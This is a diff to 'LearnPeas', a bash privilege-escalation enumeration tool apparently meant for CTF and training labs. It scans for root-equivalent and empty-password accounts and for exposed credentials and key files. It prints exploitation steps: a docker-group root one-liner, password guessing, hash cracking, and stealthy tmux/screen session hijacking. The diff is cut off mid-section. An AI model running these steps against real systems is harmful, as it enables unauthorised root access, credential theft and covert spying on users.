@@ -1,6 +1,6 @@
 #!/bin/bash
 # LearnPeas -  Privilege Escalation In-Field Educational Tool
-# Comprehensive enumeration + education for HTB/THM environments
+# Comprehensive enumeration + education for HTB/THM/CTF environments
 
 set -o pipefail
 
@@ -577,28 +577,221 @@ enum_network() {
 enum_users() {
     section "USER ENUMERATION"
     
+    # PHASE 1: SILENT SCAN - Collect all findings
+    local found_issues=0
+    local temp_sudo_members="/tmp/.learnpeas_sudo_$$"
+    local temp_unusual_uids="/tmp/.learnpeas_uids_$$"
+    local temp_shell_users="/tmp/.learnpeas_shells_$$"
+    
+    cleanup_user_temps() {
+        rm -f "$temp_sudo_members" "$temp_unusual_uids" "$temp_shell_users" 2>/dev/null
+    }
+    trap cleanup_user_temps RETURN
+    
+    # Display basic user info (always show this)
     info "Interactive users (UID >= 1000):"
     awk -F: '$3 >= 1000 && $1 != "nobody" {print "  " $1 " (UID: " $3 ")"}' /etc/passwd
     
     info "Users with shells:"
     grep -E "/(bash|sh|zsh|fish)$" /etc/passwd | cut -d: -f1 | while read u; do
         log "  $u"
+        echo "$u" >> "$temp_shell_users"
     done
     
     # Check for sudo group members
     if getent group sudo >/dev/null 2>&1; then
-        info "Members of sudo group:"
-        getent group sudo | cut -d: -f4 | tr ',' '\n' | while read u; do
-            log "  $u"
+        local sudo_members=$(getent group sudo | cut -d: -f4)
+        if [ -n "$sudo_members" ]; then
+            info "Members of sudo group:"
+            echo "$sudo_members" | tr ',' '\n' | while read u; do
+                [ -n "$u" ] && log "  $u" && echo "$u" >> "$temp_sudo_members"
+            done
+        fi
+    fi
+    
+    # Check for unusual UIDs
+    awk -F: '$3 >= 0 {print $1 ":" $3 ":" $7}' /etc/passwd | while IFS=: read username uid shell; do
+        # Check for non-root UID 0 accounts
+        if [ "$uid" = "0" ] && [ "$username" != "root" ]; then
+            echo "$username|$uid|root_equivalent" >> "$temp_unusual_uids"
+            found_issues=1
+        # System UID with shell (suspicious)
+        elif [ "$uid" -lt "1000" ] && [ "$uid" -gt "0" ]; then
+            if echo "$shell" | grep -qE "/(bash|sh|zsh|fish)$"; then
+                echo "$username|$uid|system_with_shell" >> "$temp_unusual_uids"
+                found_issues=1
+            fi
+        fi
+    done
+    
+    # Check for users with empty passwords (if shadow is readable)
+    if [ -r /etc/shadow ]; then
+        awk -F: '$2 == "" {print $1}' /etc/shadow 2>/dev/null | while read user; do
+            # Only flag if it's an interactive account (UID >= 1000) with a shell
+            local uid=$(awk -F: -v u="$user" '$1 == u {print $3}' /etc/passwd)
+            local shell=$(awk -F: -v u="$user" '$1 == u {print $7}' /etc/passwd)
+            if [ -n "$uid" ] && [ "$uid" -ge "1000" ] && echo "$shell" | grep -qE "/(bash|sh|zsh|fish)$"; then
+                echo "$user|$uid|empty_password" >> "$temp_unusual_uids"
+                found_issues=1
+            fi
         done
     fi
     
-    teach "User enumeration reveals:"
-    teach "  • Potential lateral movement targets"
-    teach "  • Users with sudo access (sudo group)"
-    teach "  • Service accounts vs. real users"
+    # Check for duplicate UIDs
+    awk -F: '{print $3}' /etc/passwd | sort | uniq -d | while read dup_uid; do
+        local users=$(awk -F: -v uid="$dup_uid" '$3 == uid {print $1}' /etc/passwd | tr '\n' ',')
+        if [ "$dup_uid" = "0" ]; then
+            echo "duplicate_root|$dup_uid|$users" >> "$temp_unusual_uids"
+            found_issues=1
+        elif [ "$dup_uid" -ge "1000" ]; then
+            echo "duplicate_user|$dup_uid|$users" >> "$temp_unusual_uids"
+            found_issues=1
+        fi
+    done
+    
+    # PHASE 2: CONDITIONAL EDUCATION (only if issues found)
+    if [ $found_issues -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  USER ACCOUNT EXPLOITATION - Understanding the Risks"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHY USER ENUMERATION MATTERS:"
+        teach "  User accounts reveal:"
+        teach "  • Lateral movement targets (other user accounts to compromise)"
+        teach "  • Privilege escalation opportunities (sudo group members)"
+        teach "  • Misconfigurations (UID 0 non-root accounts, empty passwords)"
+        teach "  • Service accounts that may have weak security"
+        teach ""
+        teach "WHAT NORMAL LOOKS LIKE:"
+        teach "  • root: UID 0 (only one)"
+        teach "  • System accounts: UID 1-999 (no shell, locked passwords)"
+        teach "  • Regular users: UID 1000+ (with shells)"
+        teach "  • sudo group: Small number of trusted users"
+        teach ""
+        teach "ATTACK VECTORS:"
+        teach "  1. UID 0 non-root account = instant root access"
+        teach "  2. Empty passwords = su to that user with no password"
+        teach "  3. Duplicate UIDs = confusing audit trails, privilege confusion"
+        teach "  4. System UIDs with shells = unusual, may have weak passwords"
+        teach "  5. sudo group members = targets for password cracking"
+        log ""
+    fi
+    
+    # PHASE 3: REPORT SPECIFIC FINDINGS
+    if [ -f "$temp_unusual_uids" ]; then
+        while IFS='|' read -r identifier uid_or_type issue_type additional; do
+            case "$issue_type" in
+                root_equivalent)
+                    critical "NON-ROOT UID 0 ACCOUNT - Instant root access: $identifier"
+                    vuln "User '$identifier' has UID 0 (root equivalent)"
+                    log ""
+                    teach "EXPLOITATION:"
+                    teach "  su $identifier"
+                    teach "  # If you know the password or it's empty, you get root"
+                    teach ""
+                    teach "WHY THIS EXISTS:"
+                    teach "  Admins sometimes create UID 0 accounts for:"
+                    teach "  • 'Backup' root accounts"
+                    teach "  • Service accounts that need full root access"
+                    teach "  • Laziness (instead of proper sudo configuration)"
+                    teach ""
+                    teach "THE DANGER:"
+                    teach "  ANY process running as this user has full root privileges."
+                    teach "  If you can su to this account, you're root."
+                    teach "  Multiple UID 0 accounts make auditing impossible."
+                    log ""
+                    ;;
+                    
+                system_with_shell)
+                    warn "System account with shell: $identifier (UID: $uid_or_type)"
+                    log ""
+                    teach "WHY THIS IS UNUSUAL:"
+                    teach "  System accounts (UID < 1000) typically have /usr/sbin/nologin"
+                    teach "  or /bin/false as their shell to prevent login."
+                    teach ""
+                    teach "WHY IT MATTERS:"
+                    teach "  • May have weak or default passwords"
+                    teach "  • Often used for services that 'need' shell access"
+                    teach "  • Target for password guessing or brute force"
+                    teach ""
+                    teach "EXPLOITATION APPROACH:"
+                    teach "  1. Try common passwords: $identifier, password, admin"
+                    teach "  2. Check if password reuse from other accounts"
+                    teach "  3. Look for credentials in config files"
+                    teach "  4. If you compromise this account, check sudo access"
+                    log ""
+                    ;;
+                    
+                empty_password)
+                    critical "USER WITH EMPTY PASSWORD: $identifier (UID: $uid_or_type)"
+                    vuln "User '$identifier' has no password set"
+                    log ""
+                    teach "INSTANT EXPLOITATION:"
+                    teach "  su $identifier"
+                    teach "  # Press Enter when prompted for password (it's empty)"
+                    teach "  # You're now logged in as $identifier"
+                    teach ""
+                    teach "WHY THIS EXISTS:"
+                    teach "  • Admin temporarily removed password and forgot to set it"
+                    teach "  • Account created with 'passwd -d' (delete password)"
+                    teach "  • Migration/import process left password blank"
+                    teach ""
+                    teach "WHAT TO DO AFTER ACCESS:"
+                    teach "  1. Check sudo permissions: sudo -l"
+                    teach "  2. Check group memberships: groups"
+                    teach "  3. Look in home directory: ls -la ~"
+                    teach "  4. Check SSH keys: cat ~/.ssh/id_rsa"
+                    log ""
+                    ;;
+                    
+                duplicate_root)
+                    critical "DUPLICATE UID 0 ACCOUNTS: $additional"
+                    vuln "Multiple accounts share UID 0 (root equivalent)"
+                    log ""
+                    teach "WHY THIS IS CRITICAL:"
+                    teach "  Multiple UID 0 accounts = multiple paths to root."
+                    teach "  Each account may have different:"
+                    teach "  • Passwords (some might be weaker)"
+                    teach "  • SSH keys"
+                    teach "  • Authentication methods"
+                    teach ""
+                    teach "EXPLOITATION:"
+                    teach "  Try each account separately:"
+                    teach "  $(echo "$additional" | tr ',' '\n' | while read acc; do echo "  su $acc"; done)"
+                    teach ""
+                    teach "  One of them might have:"
+                    teach "  • Empty password"
+                    teach "  • Weak password"
+                    teach "  • SSH key you can find"
+                    log ""
+                    ;;
+                    
+                duplicate_user)
+                    warn "Duplicate UID for regular users: $additional (UID: $uid_or_type)"
+                    log ""
+                    teach "WHY THIS IS SUSPICIOUS:"
+                    teach "  Multiple usernames sharing the same UID can access"
+                    teach "  each other's files. This is unusual and often indicates:"
+                    teach "  • Misconfiguration"
+                    teach "  • Legacy account management issues"
+                    teach "  • Intentional backdoor"
+                    teach ""
+                    teach "IMPLICATIONS:"
+                    teach "  If you compromise one of these accounts, you effectively"
+                    teach "  have access to all accounts with the same UID."
+                    log ""
+                    ;;
+            esac
+        done < "$temp_unusual_uids"
+    fi
+    
+    # PHASE 4: CLEAN SUMMARY
+        log ""
+    if [ ! -s "$temp_unusual_uids" ]; then
+        ok "No unusual user configurations detected"
+    fi
 }
-
 # === COMPREHENSIVE SUDO ANALYSIS ===
 enum_sudo() {
     section "SUDO PERMISSIONS ANALYSIS"
@@ -3384,39 +3577,193 @@ enum_cicd() {
 enum_processes() {
     section "RUNNING PROCESSES ANALYSIS"
     
-    explain_concept "Process Monitoring" \
-        "Other users' processes may contain credentials in command line arguments or environment variables." \
-        "Many admins run scripts with hardcoded passwords visible in 'ps aux'. Cron jobs pass credentials as arguments. Services load API keys from environment." \
-        "Monitor with: watch -n 1 'ps aux'\nLook for: mysql -p, curl -u, ssh user@host, API tokens"
+    # PHASE 1: SILENT SCAN - Collect findings
+    local temp_cred_procs="/tmp/.learnpeas_cred_procs_$$"
+    local temp_sessions="/tmp/.learnpeas_sessions_$$"
     
-    info "Current processes (checking for credentials in command line):"
-    ps aux | grep -iE "password=|passwd=|-p |--password|token=|key=|secret=|api=" | grep -v "grep" | head -10 | while read line; do
-        warn "Potentially sensitive process:"
-        log "  $line"
-        log ""  # Add blank line between each process      
+    cleanup_process_temps() {
+        rm -f "$temp_cred_procs" "$temp_sessions" 2>/dev/null
+    }
+    trap cleanup_process_temps RETURN
+    
+    # Check for credentials in process command lines
+    ps aux | grep -iE "password=|passwd=|-p[[:space:]]+[^[:space:]]+|--password[[:space:]]+|token=|key=|secret=|api.*=" | grep -v "grep" | while read line; do
+        # Filter out common false positives
+        echo "$line" | grep -qE "ps aux|teachpeas|learnpeas|linpeas|brave|chrome|firefox|electron|" && continue
+        echo "$line" >> "$temp_cred_procs"
     done
-    # Check for tmux/screen sessions
+    
+    # Check for tmux sessions
     if command -v tmux >/dev/null 2>&1; then
-        local sessions=$(tmux ls 2>/dev/null | wc -l)
-        if [ $sessions -gt 0 ]; then
-            critical "Active tmux sessions - Attach to steal active shells"
-            vuln "Active tmux sessions found!"
-            teach "Try attaching: tmux attach -t <session>"
-            teach "May get access to other user's shell"
-            tmux ls 2>/dev/null
+        local tmux_sessions=$(tmux ls 2>/dev/null | wc -l)
+        if [ "$tmux_sessions" -gt 0 ]; then
+            echo "tmux|$tmux_sessions" >> "$temp_sessions"
         fi
     fi
     
+    # Check for screen sessions
     if command -v screen >/dev/null 2>&1; then
-        screen -ls 2>/dev/null | grep -q Detached && {
-            critical "Detached screen sessions - Attach to hijack shells"
-            vuln "Detached screen sessions found!"
-            teach "Try attaching: screen -r"
-            screen -ls 2>/dev/null
-        }
+        if screen -ls 2>/dev/null | grep -q "Detached\|Attached"; then
+            local screen_count=$(screen -ls 2>/dev/null | grep -c "Detached\|Attached")
+            echo "screen|$screen_count" >> "$temp_sessions"
+        fi
+    fi
+    
+    # PHASE 2: CONDITIONAL EDUCATION (only if findings)
+    if [ -s "$temp_cred_procs" ] || [ -s "$temp_sessions" ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  PROCESS ANALYSIS - Credential Exposure & Session Hijacking"
+        teach "╚═══════════════════════════════════════════════════════════╝"
+        teach ""
+        teach "WHY PROCESS MONITORING MATTERS:"
+        teach "  Running processes reveal:"
+        teach "  • Credentials passed as command-line arguments (visible in ps)"
+        teach "  • Active sessions (tmux/screen) you can attach to"
+        teach "  • Services running as root that might be exploitable"
+        teach "  • Long-running processes that might have secrets in memory"
+        teach ""
+        teach "COMMAND-LINE CREDENTIALS:"
+        teach "  When users run: mysql -u root -p SecretPass123"
+        teach "  The password appears in 'ps aux' output for everyone to see."
+        teach "  This persists in process list until the command completes."
+        teach ""
+        teach "SESSION HIJACKING:"
+        teach "  tmux and screen create persistent terminal sessions."
+        teach "  If you can attach to another user's session:"
+        teach "  • You see everything they're typing"
+        teach "  • You can execute commands as them"
+        teach "  • You inherit their permissions and active shells"
+        log ""
+    fi
+    
+    # PHASE 3: REPORT SPECIFIC FINDINGS
+    
+    # Report credential exposures
+    if [ -s "$temp_cred_procs" ]; then
+        critical "CREDENTIALS IN PROCESS COMMAND LINES"
+        vuln "Processes with potentially exposed credentials detected"
+        log ""
+        
+        cat "$temp_cred_procs" | while read line; do
+            warn "Process: $line"
+        done
+        
+        log ""
+        teach "EXPLOITATION:"
+        teach "  These credentials are visible to all users via 'ps aux'."
+        teach "  Copy the credentials and try using them for:"
+        teach "  • Database access"
+        teach "  • SSH connections"
+        teach "  • API authentication"
+        teach "  • Service accounts"
+        teach ""
+        teach "WHY THIS HAPPENS:"
+        teach "  Developers and admins pass credentials on command line for:"
+        teach "  • Quick testing ('just this once')"
+        teach "  • Automated scripts without proper secret management"
+        teach "  • Convenience (typing password inline instead of prompt)"
+        teach ""
+        teach "BETTER ALTERNATIVES (as admin):"
+        teach "  • Use config files with restricted permissions"
+        teach "  • Use environment variables"
+        teach "  • Use password prompts instead of arguments"
+        teach "  • Use credential management systems (vault, secrets manager)"
+        log ""
+    fi
+    
+    # Report tmux sessions
+    if [ -s "$temp_sessions" ]; then
+        while IFS='|' read -r session_type count; do
+            if [ "$session_type" = "tmux" ]; then
+                critical "ACTIVE TMUX SESSIONS - Attach to steal shells"
+                vuln "Found $count active tmux session(s)"
+                log ""
+                
+                # List the actual sessions
+                info "Available tmux sessions:"
+                tmux ls 2>/dev/null | while read session; do
+                    log "  $session"
+                done
+                
+                log ""
+                teach "╔═══════════════════════════════════════════════════════════╗"
+                teach "║  TMUX SESSION HIJACKING"
+                teach "╚═══════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IS TMUX:"
+                teach "  Terminal multiplexer - creates persistent terminal sessions"
+                teach "  that survive disconnection. Users can detach/reattach sessions."
+                teach ""
+                teach "WHY YOU CAN HIJACK THEM:"
+                teach "  tmux sessions are stored in /tmp/tmux-UID/"
+                teach "  If permissions allow, you can attach to other users' sessions."
+                teach ""
+                teach "EXPLOITATION:"
+                teach "  1. List sessions: tmux ls"
+                teach "  2. Attach to session: tmux attach -t <session-name>"
+                teach "  3. If multiple sessions exist, try each one"
+                teach ""
+                teach "WHAT YOU GET:"
+                teach "  • Live view of everything the user is typing"
+                teach "  • Ability to execute commands as that user"
+                teach "  • Access to their active shell with their permissions"
+                teach "  • Any credentials they type become visible to you"
+                teach ""
+                teach "IF ATTACHMENT FAILS:"
+                teach "  • Check socket permissions: ls -la /tmp/tmux-*/"
+                teach "  • Try with sudo if you have it: sudo tmux attach -t <session>"
+                teach "  • Some sessions require specific user ownership"
+                teach ""
+                teach "STEALTH CONSIDERATIONS:"
+                teach "  • The user will see you attach (terminal shows 'attached')"
+                teach "  • Everything you type appears in their terminal too"
+                teach "  • Better to observe than interact (they'll notice commands)"
+                teach "  • Detach quickly after gathering info: Ctrl+b, then d"
+                log ""
+                
+            elif [ "$session_type" = "screen" ]; then
+                critical "DETACHED SCREEN SESSIONS - Attach to hijack shells"
+                vuln "Found $count screen session(s)"
+                log ""
+                
+                # List the actual sessions
+                info "Available screen sessions:"
+                screen -ls 2>/dev/null | grep -E "Detached|Attached" | while read session; do
+                    log "  $session"
+                done
+                
+                log ""
+                teach "╔═══════════════════════════════════════════════════════════╗"
+                teach "║  SCREEN SESSION HIJACKING"
+                teach "╚═══════════════════════════════════════════════════════════╝"
+                teach ""
+                teach "WHAT IS SCREEN:"
+                teach "  Like tmux, screen creates persistent terminal sessions."
+                teach "  Older tool but still widely used."
+                teach ""
+                teach "EXPLOITATION:"
+                teach "  1. List sessions: screen -ls"
+                teach "  2. Attach to detached session: screen -r"
+                teach "  3. If multiple sessions: screen -r <pid.tty.host>"
+                teach ""
+                teach "MULTI-USER ATTACH:"
+                teach "  screen -x  # Attach even if session is already attached"
+                teach "  This allows you to watch what another user is doing live."
+                teach ""
+                teach "WHAT YOU GET:"
+                teach "  Same as tmux - live access to user's terminal session."
+                log ""
+            fi
+        done < "$temp_sessions"
+    fi
+    
+    # PHASE 4: CLEAN SUMMARY
+    log ""
+    if [ ! -s "$temp_cred_procs" ] && [ ! -s "$temp_sessions" ]; then
+        ok "No exposed credentials or hijackable sessions detected"
     fi
 }
-
 # === MAIL & LOGS ===
 enum_mail_logs() {
     section "MAIL SPOOL & LOG ANALYSIS"
@@ -5158,7 +5505,7 @@ enum_groups() {
     
     # Check for docker group
     if echo "$current_groups" | grep -qw "docker"; then
-        critical "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+        vuln "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
         vuln "You are in the DOCKER group!"
         explain_concept "Docker Group Exploitation" \
             "Docker daemon runs as root. Docker group members can execute commands inside containers that run as root and can mount the host filesystem." \
@@ -5168,7 +5515,7 @@ enum_groups() {
     
     # Check for lxd/lxc group
     if echo "$current_groups" | grep -qE "lxd|lxc"; then
-        critical "LXD/LXC GROUP - Create privileged container for root access"
+        vuln "LXD/LXC GROUP - Create privileged container for root access"
         vuln "You are in the LXD/LXC group!"
         explain_concept "LXD Group Exploitation" \
             "LXD manages Linux containers. Group members can create privileged containers with security.privileged=true, which disables most isolation." \
@@ -5686,31 +6033,404 @@ enum_software_versions() {
 enum_interesting_files() {
     section "INTERESTING FILE DISCOVERY"
     
-    teach "Looking for unusual or interesting files that might contain flags, credentials, or other useful information..."
+    # PHASE 1: SILENT SCAN - Collect high-value findings only
+    local temp_suid_unusual="/tmp/.learnpeas_suid_unusual_$$"
+    local temp_recent_sensitive="/tmp/.learnpeas_recent_sensitive_$$"
+    local temp_cred_files="/tmp/.learnpeas_cred_files_$$"
+    local temp_config_readable="/tmp/.learnpeas_config_readable_$$"
     
-    # SUID/SGID files in unusual locations
-    info "SUID/SGID files in non-standard locations:"
-    find /home /tmp /var /opt -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -10 | while read file; do
-        warn "  $file"
-    done
+    cleanup_interesting_temps() {
+        rm -f "$temp_suid_unusual" "$temp_recent_sensitive" "$temp_cred_files" "$temp_config_readable" 2>/dev/null
+    }
+    trap cleanup_interesting_temps RETURN
     
-    # Recently modified files
-    info "Recently modified files (last 24 hours) in sensitive locations:"
-    find /etc /root -type f -mtime -1 2>/dev/null | head -10 | while read file; do
-        log "  $file"
-    done
+    # === CHECK 1: SUID/SGID in unusual locations (high priority) ===
+    info "Scanning for SUID/SGID binaries in unusual locations..."
+    warn "Press ENTER to skip this check and continue to next enumeration."
     
-    # Files with passwords in name
-    info "Files with 'password' in name:"
-    find / -name "*password*" -o -name "*passwd*" 2>/dev/null | head -10 | while read file; do
-        [ -r "$file" ] && log "  $file"
-    done
+    local skip_suid=false
+    local suid_locations=("/home" "/tmp" "/var/tmp" "/opt" "/usr/local/bin" "/usr/local/sbin")
+    local total_suid=${#suid_locations[@]}
+    local current_suid=0
     
-    # Backup files
-    info "Backup files that might contain credentials:"
-    find /var/backups /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -10 | while read file; do
-        [ -r "$file" ] && log "  $file"
+    # Whitelist of known legitimate SUID locations to reduce false positives
+    local legit_suid_patterns="passwd|sudo|su|mount|umount|ping|fusermount"
+    
+    for location in "${suid_locations[@]}"; do
+        # Check for skip
+        if read -t 0.01; then
+            skip_suid=true
+            echo ""
+            info "Skipping SUID search..."
+            break
+        fi
+        
+        current_suid=$((current_suid + 1))
+        echo -ne "\r[INFO] Searching $location... ($current_suid/$total_suid) - Press ENTER to skip" >&2
+        
+        [ ! -d "$location" ] && continue
+        
+        find "$location" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | while read suid_file; do
+            local basename=$(basename "$suid_file")
+            # Skip if it's a known legitimate binary
+            if ! echo "$basename" | grep -qE "$legit_suid_patterns"; then
+                echo "$suid_file" >> "$temp_suid_unusual"
+            fi
+        done
     done
+    echo -ne "\r\033[K" >&2
+    
+    # === CHECK 2: Recently modified files in sensitive locations (last 48h) ===
+    if ! $skip_suid; then
+        info "Scanning recently modified files in sensitive locations..."
+        warn "Press ENTER to skip this check."
+        
+        local skip_recent=false
+        local recent_dirs=("/etc" "/root" "/var/www" "/opt")
+        local total_recent=${#recent_dirs[@]}
+        local current_recent=0
+        
+        for location in "${recent_dirs[@]}"; do
+            # Check for skip
+            if read -t 0.01; then
+                skip_recent=true
+                echo ""
+                info "Skipping recent file search..."
+                break
+            fi
+            
+            current_recent=$((current_recent + 1))
+            echo -ne "\r[INFO] Checking $location... ($current_recent/$total_recent) - Press ENTER to skip" >&2
+            
+            [ ! -d "$location" ] && continue
+            
+            # Only flag files modified in last 48 hours in sensitive dirs
+            find "$location" -type f -mtime -2 2>/dev/null | while read recent_file; do
+                # Filter to only config files, scripts, or executables
+                if echo "$recent_file" | grep -qE "\.(conf|config|sh|py|pl|rb|php|yml|yaml|xml|ini|json)$|/bin/|/sbin/"; then
+                    echo "$recent_file" >> "$temp_recent_sensitive"
+                fi
+            done
+        done
+        echo -ne "\r\033[K" >&2
+    fi
+    
+    # === CHECK 3: Credential files (specific patterns only) ===
+    if ! $skip_suid && ! ${skip_recent:-false}; then
+        info "Scanning for credential files..."
+        warn "Press ENTER to skip this check."
+        
+        local skip_creds=false
+        local cred_dirs=("/home" "/var/www" "/opt" "/root")
+        local total_creds=${#cred_dirs[@]}
+        local current_creds=0
+        
+        # High-value patterns only (not just "password" in filename)
+        local cred_patterns=(
+            "*.key"
+            "*.pem"
+            "*.ppk"
+            "*secret*"
+            "*credential*"
+            ".htpasswd"
+            "*.pgpass"
+            ".my.cnf"
+            ".netrc"
+        )
+        
+        for location in "${cred_dirs[@]}"; do
+            # Check for skip
+            if read -t 0.01; then
+                skip_creds=true
+                echo ""
+                info "Skipping credential file search..."
+                break
+            fi
+            
+            current_creds=$((current_creds + 1))
+            echo -ne "\r[INFO] Searching $location... ($current_creds/$total_creds) - Press ENTER to skip" >&2
+            
+            [ ! -d "$location" ] && continue
+            
+            for pattern in "${cred_patterns[@]}"; do
+                find "$location" -maxdepth 5 -name "$pattern" -type f -readable 2>/dev/null | head -20 | while read cred_file; do
+                    # Additional quality filter - must actually contain credential-like content
+                    if file "$cred_file" 2>/dev/null | grep -qE "text|ASCII|PEM"; then
+                        if grep -qE "PRIVATE KEY|password|secret|token|BEGIN.*PRIVATE" "$cred_file" 2>/dev/null; then
+                            echo "$cred_file" >> "$temp_cred_files"
+                        fi
+                    elif echo "$cred_file" | grep -qE "\.key$|\.pem$|\.ppk$"; then
+                        # Key files by extension (even if binary)
+                        echo "$cred_file" >> "$temp_cred_files"
+                    fi
+                done
+            done
+        done
+        echo -ne "\r\033[K" >&2
+    fi
+    
+    # === CHECK 4: Readable sensitive config files ===
+    if ! $skip_suid && ! ${skip_recent:-false} && ! ${skip_creds:-false}; then
+        info "Checking readable sensitive configuration files..."
+        
+        # Specific high-value configs (not every .conf file)
+        local sensitive_configs=(
+            "/etc/shadow"
+            "/etc/sudoers"
+            "/etc/ssh/sshd_config"
+            "/etc/mysql/my.cnf"
+            "/etc/postgresql/*/main/pg_hba.conf"
+            "/etc/openvpn/*.conf"
+            "/root/.ssh/config"
+            "/root/.aws/credentials"
+            "/root/.docker/config.json"
+        )
+        
+        for config_pattern in "${sensitive_configs[@]}"; do
+            for config in $config_pattern; do
+                [ ! -e "$config" ] && continue
+                if [ -r "$config" ]; then
+                    echo "$config" >> "$temp_config_readable"
+                fi
+            done
+        done
+    fi
+    
+    # Clear any remaining input
+    read -t 0.01 -n 10000 discard 2>/dev/null || true
+    
+    # PHASE 2: CONDITIONAL EDUCATION (only if high-value findings)
+    local found_issues=0
+    [ -s "$temp_suid_unusual" ] && found_issues=$((found_issues + 1))
+    [ -s "$temp_recent_sensitive" ] && found_issues=$((found_issues + 1))
+    [ -s "$temp_cred_files" ] && found_issues=$((found_issues + 1))
+    [ -s "$temp_config_readable" ] && found_issues=$((found_issues + 1))
+    
+    if [ $found_issues -gt 0 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  INTERESTING FILES - Why These Matter"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "FILE DISCOVERY CATEGORIES:"
+        teach ""
+        teach "1. UNUSUAL SUID/SGID BINARIES:"
+        teach "   SUID binaries in /tmp, /home, or /opt are suspicious."
+        teach "   Legitimate SUID binaries stay in /usr/bin or /bin."
+        teach "   Custom SUID binaries often have vulnerabilities."
+        teach ""
+        teach "2. RECENTLY MODIFIED CONFIGS:"
+        teach "   Files modified in last 48 hours in /etc or /root indicate:"
+        teach "   • Active system changes (admin is working)"
+        teach "   • Temporary misconfigurations during updates"
+        teach "   • Testing environments with weak security"
+        teach "   Recent changes = less hardened, more mistakes"
+        teach ""
+        teach "3. CREDENTIAL FILES:"
+        teach "   SSH keys, API tokens, password files left readable"
+        teach "   Often forgotten during development/testing"
+        teach "   Enable lateral movement or service access"
+        teach ""
+        teach "4. READABLE SENSITIVE CONFIGS:"
+        teach "   Files that should only be readable by root"
+        teach "   Contain passwords, security settings, keys"
+        teach "   Indicate permission misconfigurations"
+        log ""
+    fi
+    
+    # PHASE 3: REPORT SPECIFIC FINDINGS
+    
+    # Report unusual SUID binaries
+    if [ -s "$temp_suid_unusual" ]; then
+        critical "UNUSUAL SUID/SGID BINARIES - Custom binaries with root privileges"
+        log ""
+        
+        while IFS= read -r suid_file; do
+            local perms=$(stat -c %a "$suid_file" 2>/dev/null)
+            local owner=$(stat -c %U "$suid_file" 2>/dev/null)
+            
+            vuln "SUID/SGID binary: $suid_file"
+            info "  Owner: $owner | Permissions: $perms"
+            log ""
+        done < "$temp_suid_unusual"
+        
+        teach "ANALYSIS STEPS FOR UNUSUAL SUID BINARIES:"
+        teach ""
+        teach "  1. Identify binary type:"
+        teach "     file /path/to/suid_binary"
+        teach ""
+        teach "  2. Check for readable strings:"
+        teach "     strings /path/to/suid_binary | grep -E 'system|exec|popen|/bin/'"
+        teach ""
+        teach "  3. Trace library calls:"
+        teach "     ltrace /path/to/suid_binary 2>&1 | grep -E 'system|exec'"
+        teach ""
+        teach "  4. Look for command execution without absolute paths:"
+        teach "     strings /path/to/suid_binary | grep -vE '^/' | grep '^[a-z]'"
+        teach "     # These can be PATH hijacked"
+        teach ""
+        teach "  5. Check GTFOBins:"
+        teach "     https://gtfobins.github.io/#$(basename $(head -1 $temp_suid_unusual))"
+        teach ""
+        teach "COMMON VULNERABILITIES:"
+        teach "  • Calls system(\"command\") without full path → PATH hijacking"
+        teach "  • Buffer overflow in user input handling"
+        teach "  • Race conditions (TOCTOU)"
+        teach "  • Unsafe environment variable usage"
+        teach "  • Command injection via arguments"
+        log ""
+    fi
+    
+    # Report recently modified sensitive files
+    if [ -s "$temp_recent_sensitive" ]; then
+        warn "Recently modified files in sensitive locations (last 48 hours)"
+        log ""
+        
+        local count=0
+        while IFS= read -r recent_file; do
+            count=$((count + 1))
+            [ $count -gt 15 ] && break  # Limit output
+            
+            local mod_time=$(stat -c %y "$recent_file" 2>/dev/null | cut -d. -f1)
+            info "  $recent_file"
+            log "    Modified: $mod_time"
+        done < "$temp_recent_sensitive"
+        
+        local total=$(wc -l < "$temp_recent_sensitive")
+        if [ $total -gt 15 ]; then
+            info "  ... and $((total - 15)) more files"
+        fi
+        
+        log ""
+        teach "WHY RECENT MODIFICATIONS MATTER:"
+        teach "  • Admin actively making changes = higher chance of mistakes"
+        teach "  • Temporary test configurations left in place"
+        teach "  • New services not yet hardened"
+        teach "  • Modified config files may have backup versions (.bak, ~)"
+        teach ""
+        teach "WHAT TO CHECK:"
+        teach "  1. Review modified configs for new vulnerabilities"
+        teach "  2. Look for backup files: ls -la /etc/*.bak /etc/*~"
+        teach "  3. Check if modifications introduced writable permissions"
+        teach "  4. Recent cron jobs: cat /etc/crontab"
+        log ""
+    fi
+    
+    # Report credential files
+    if [ -s "$temp_cred_files" ]; then
+        critical "CREDENTIAL FILES READABLE - SSH keys, secrets, password files"
+        log ""
+        
+        while IFS= read -r cred_file; do
+            vuln "Credential file: $cred_file"
+            
+            # Determine file type and give specific guidance
+            case "$cred_file" in
+                *.pem|*.key|*id_rsa*|*id_ed25519*|*id_ecdsa*)
+                    critical "  SSH/SSL private key detected"
+                    teach "  Usage: ssh -i $cred_file user@target"
+                    teach "  Check key permissions: chmod 600 $cred_file"
+                    ;;
+                *.ppk)
+                    warn "  PuTTY private key (Windows format)"
+                    teach "  Convert to OpenSSH: puttygen $cred_file -O private-openssh -o id_rsa"
+                    ;;
+                .htpasswd)
+                    warn "  Apache htpasswd file - contains password hashes"
+                    teach "  Crack with: john $cred_file"
+                    ;;
+                *.pgpass|.my.cnf)
+                    critical "  Database credential file"
+                    teach "  Contains plaintext database passwords"
+                    ;;
+                .netrc)
+                    warn "  .netrc file - auto-login credentials"
+                    teach "  Contains FTP/HTTP credentials in plaintext"
+                    ;;
+                *secret*|*credential*)
+                    warn "  Generic credential file - inspect contents"
+                    teach "  cat $cred_file | head -20"
+                    ;;
+            esac
+            log ""
+        done < "$temp_cred_files"
+        
+        teach "CREDENTIAL FILE EXPLOITATION:"
+        teach ""
+        teach "  SSH KEYS:"
+        teach "    1. Copy to attacker machine"
+        teach "    2. Set permissions: chmod 600 key"
